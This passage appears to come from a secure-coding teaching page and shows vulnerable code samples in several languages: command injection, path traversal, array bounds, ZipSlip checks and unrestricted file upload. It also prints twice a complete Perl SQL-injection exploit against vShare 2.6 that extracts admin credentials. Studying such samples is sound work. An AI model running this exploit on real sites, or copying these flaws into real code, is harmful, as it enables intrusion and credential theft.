  <span class="token keyword">const</span> escapedText <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> sanitizedText <span class="token operator">=</span> utils<span class="token punctuation">.</span><span class="token function">replaceCharactersWithSpaces</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Example command:</span>
  <span class="token comment">//  echo "hello" | ${SYNTH_SCRIPT}</span>

  <span class="token keyword">const</span> cmd <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>escapedText<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" | </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token constant">SYNTH_SCRIPT</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Running command - \n</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cmd<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Synthesizing </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>sanitizedText<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">maxBuffer</span><span class="token operator">:</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token comment">// 1 mb buffer</span>
    <span class="token literal-property property">cwd</span><span class="token operator">:</span> <span class="token string">'/tmp/'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">60000</span><span class="token punctuation">,</span> <span class="token comment">// 1 minute timeout</span>
    <span class="token literal-property property">encoding</span><span class="token operator">:</span> <span class="token string">'buffer'</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> options<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> child <span class="token operator">=</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token constant">SYNTH_SCRIPT</span><span class="token punctuation">,</span> options<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> errMsg <span class="token operator">=</span> utils<span class="token punctuation">.</span><span class="token function">getExecErrorMessage</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'audio/wav'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> data <span class="token operator">=</span> type <span class="token operator">===</span> <span class="token string">'base64'</span> <span class="token operator">?</span> stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span> <span class="token operator">:</span> stdout<span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  child<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>sanitizedText<span class="token punctuation">)</span><span class="token punctuation">;</span>
  child<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
1a:T685,<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">buildList</span><span class="token punctuation">(</span><span class="token keyword">int</span> untrustedListSize<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">></span> untrustedListSize<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"Negative value supplied for list size, die evil hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token class-name">Widget</span><span class="token punctuation">[</span><span class="token punctuation">]</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Widget</span><span class="token punctuation">[</span>untrustedListSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
    list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Widget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
1b:T4cd,#!/usr/bin/perl
# Coded by: Saime
# vShare Youtube Clone v2.6 (group_posts.php tid) Remote SQL Injection
# Author: Saime
# URL: http://www.buyscripts.in
# Price: $10.00
# Date: 8/05/2008
# Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed and everyone else I forgot!
# Site: http://h4ck-y0u.org

use LWP;

$site = @ARGV[0];
$ua = LWP::UserAgent->new;

my $injection = 'group_posts.php?tid=1+union+select+1,2,3,4,concat(username,0x3a,email,0x3a,pwd),6,7+from+signup+limit+0,1--';
if (@ARGV < 1)
{
    &usage;
}
else
{
    &exploit()
}

sub exploit()
{
    print "[+] Exploiting...\n";
    $passres = $ua->get("http://$site/$injection");
    $exploitcon = $passres->content;
    if ($exploitcon =~ m/<b>Topic:<\/b>(.*)<b>(.*):(.*):([a-f0-9]{32})<\/b><br \/>/gmi)
    {
        $pass = $4;
        $admin = $2;
        $email = $3;
        print "[+] Admin Password: $pass\n";
        print "[+] Admin Username: $admin\n";
        print "[+] Admin Email: $email\n";
    }
    else
    {
        print "[-] Unable To Get The Password...\n";
        exit(0);
    }
}
sub usage()
{
    print "Usage: ./vshare.pl [host]\n";
    print "Example: ./vshare.pl www.site.com\n";
    exit(0);
}
1c:T1673,<span class="token comment">#!/usr/bin/perl</span>
<span class="token comment"># Coded by: Saime</span>
<span class="token comment"># vShare Youtube Clone v2.6 (group_posts.php tid) Remote SQL Injection</span>
<span class="token comment"># Author: Saime</span>
<span class="token comment"># URL: http://www.buyscripts.in</span>
<span class="token comment"># Price: $10.00</span>
<span class="token comment"># Date: 8/05/2008</span>
<span class="token comment"># Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed and everyone else I forgot!</span>
<span class="token comment"># Site: http://h4ck-y0u.org</span>

<span class="token keyword">use</span> LWP<span class="token punctuation">;</span>

<span class="token variable">$site</span> <span class="token operator">=</span> <span class="token variable">@ARGV</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ua</span> <span class="token operator">=</span> LWP<span class="token punctuation">:</span><span class="token punctuation">:</span>UserAgent<span class="token operator">-></span>new<span class="token punctuation">;</span>

<span class="token keyword">my</span> <span class="token variable">$injection</span> <span class="token operator">=</span> <span class="token string">'group_posts.php?tid=1+union+select+1,2,3,4,concat(username,0x3a,email,0x3a,pwd),6,7+from+signup+limit+0,1--'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">@ARGV</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">&amp;usage</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token variable">&amp;exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">sub</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">print</span> <span class="token string">"[+] Exploiting...\n"</span><span class="token punctuation">;</span>
    <span class="token variable">$passres</span> <span class="token operator">=</span> <span class="token variable">$ua</span><span class="token operator">-></span>get<span class="token punctuation">(</span><span class="token string">"http://$site/$injection"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$exploitcon</span> <span class="token operator">=</span> <span class="token variable">$passres</span><span class="token operator">-></span>content<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$exploitcon</span> <span class="token operator">=~</span> <span class="token regex">m/&lt;b>Topic:&lt;\/b>(.*)&lt;b>(.*):(.*):([a-f0-9]{32})&lt;\/b>&lt;br \/>/gmi</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$4</span><span class="token punctuation">;</span>
        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token variable">$2</span><span class="token punctuation">;</span>
        <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$3</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> <span class="token string">"[+] Admin Password: $pass\n"</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> <span class="token string">"[+] Admin Username: $admin\n"</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> <span class="token string">"[+] Admin Email: $email\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">print</span> <span class="token string">"[-] Unable To Get The Password...\n"</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">sub</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">print</span> <span class="token string">"Usage: ./vshare.pl [host]\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span> <span class="token string">"Example: ./vshare.pl www.site.com\n"</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
1d:T8a0,<span class="token keyword">int</span> <span class="token function">getValueFromArray</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>array<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> value<span class="token punctuation">;</span>

    <span class="token comment">// check that the array index is less than the maximum</span>
    <span class="token comment">// length of the array</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&lt;</span> len<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>

        <span class="token comment">// get the value at the specified index of the array</span>
        value <span class="token operator">=</span> array<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// if array index is invalid then output error message</span>
    <span class="token comment">// and return value indicating error</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value is: %d\n"</span><span class="token punctuation">,</span> array<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        value <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> value<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
1e:T908,<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
offset <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>attr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    attr<span class="token operator">-></span>type <span class="token operator">=</span> R_BIN_JAVA_ATTR_TYPE_BOOTSTRAP_METHODS_ATTR<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">></span> sz<span class="token punctuation">)</span>  <span class="token punctuation">{</span>
        <span class="token function">free</span> <span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    attr<span class="token operator">-></span>info<span class="token punctuation">.</span>bootstrap_methods_attr<span class="token punctuation">.</span>num_bootstrap_methods <span class="token operator">=</span> <span class="token function">R_BIN_JAVA_USHORT</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
    offset <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    attr<span class="token operator">-></span>info<span class="token punctuation">.</span>bootstrap_methods_attr<span class="token punctuation">.</span>bootstrap_methods <span class="token operator">=</span> <span class="token function">r_list_newf</span> <span class="token punctuation">(</span>r_bin_java_bootstrap_method_free<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
1f:T86f,<span class="token keyword">my</span> <span class="token variable">$dataPath</span> <span class="token operator">=</span> <span class="token string">"/users/cwe/profiles"</span><span class="token punctuation">;</span>
<span class="token keyword">my</span> <span class="token variable">$username</span> <span class="token operator">=</span> param<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">my</span> <span class="token variable">$profilePath</span> <span class="token operator">=</span> <span class="token variable">$dataPath</span><span class="token operator">.</span><span class="token string">"/"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token punctuation">;</span>

open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token variable">$profilePath</span><span class="token punctuation">)</span> <span class="token operator">||</span> ExitError<span class="token punctuation">(</span><span class="token string">"profile read error: $profilePath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span> <span class="token string">"&lt;ul>\n"</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">print</span> <span class="token string">"&lt;li>$_&lt;/li>\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">print</span> <span class="token string">"&lt;/ul>\n"</span><span class="token punctuation">;</span>
20:T77d,<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    filename <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            file_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> FileNotFoundError <span class="token keyword">as</span>    e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error - file not found"</span><span class="token punctuation">)</span>
main<span class="token punctuation">(</span><span class="token punctuation">)</span>
21:T967,<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    filename <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>normpath<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>os<span class="token punctuation">.</span>sep<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>filename<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            file_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> FileNotFoundError <span class="token keyword">as</span>    e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error - file not found"</span><span class="token punctuation">)</span>
main<span class="token punctuation">(</span><span class="token punctuation">)</span>
22:T628,public class PathTraversalChecker {

    /**
     * Checks the entry name for path traversal vulnerable sequences.
     *
     * This code is used for path traversal, ZipSlip and TarSlip detection.
     *
     * <b>IMPLEMENTATION NOTE</b>
     * We do it this way instead of the way recommended in <a href="https://snyk.io/research/zip-slip-vulnerability"></a>
     * for performance reasons, calling {@link File#getCanonicalPath()} is too expensive.
     *
     * @throws IllegalArgumentException if the entry contains vulnerable sequences
     */
    public static String safePathName(String name) {
        if (isUnsafePathName(name)) {
            throw new IllegalArgumentException(format("'%s' is not a safe archive entry or path name.", name));
        }
        return name;
    }

    public static boolean isUnsafePathName(String name) {
        return name.isEmpty()
            || name.startsWith("/")
            || name.startsWith("\\")
            || containsDirectoryNavigation(name)
            || (name.contains(":") && isWindows());
    }

    private static boolean containsDirectoryNavigation(String name) {
        if (!name.contains("..")) {
            return false;
        }
        // We have a .. but if not before a file separator or at the end, it is OK
        return name.endsWith("\\..")
            || name.contains("..\\")
            || name.endsWith("/..")
            || name.contains("../");
    }

    private static boolean isWindows() {
        return System.getProperty("os.name").toLowerCase(Locale.US).contains("windows");
    }
}
23:T1d03,<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PathTraversalChecker</span> <span class="token punctuation">{</span>

    <span class="token comment">/**
     * Checks the entry name for path traversal vulnerable sequences.
     *
     * This code is used for path traversal, ZipSlip and TarSlip detection.
     *
     * &lt;b>IMPLEMENTATION NOTE&lt;/b>
     * We do it this way instead of the way recommended in &lt;a href="https://snyk.io/research/zip-slip-vulnerability">&lt;/a>
     * for performance reasons, calling {@link File#getCanonicalPath()} is too expensive.
     *
     * @throws IllegalArgumentException if the entry contains vulnerable sequences
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">safePathName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isUnsafePathName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"'%s' is not a safe archive entry or path name."</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isUnsafePathName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> name<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token function">containsDirectoryNavigation</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isWindows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">containsDirectoryNavigation</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// We have a .. but if not before a file separator or at the end, it is OK</span>
        <span class="token keyword">return</span> name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"\\.."</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"..\\"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"/.."</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isWindows</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span><span class="token constant">US</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"windows"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
24:Ta0a,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_picture.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    Choose a file to upload:
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
25:T8ed,<span class="token comment">//upload_picture.php</span>
<span class="token operator">...</span>
<span class="token comment">// Define the target location where the picture being</span>
<span class="token comment">// uploaded is going to be saved.</span>
<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"pictures/"</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Move the uploaded file to the new location.</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The picture has been successfully uploaded."</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"There was an error uploading the picture, please try again."</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
26:T1a9a,<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">//Check if the file is JPG, PNG or GIF.</span>
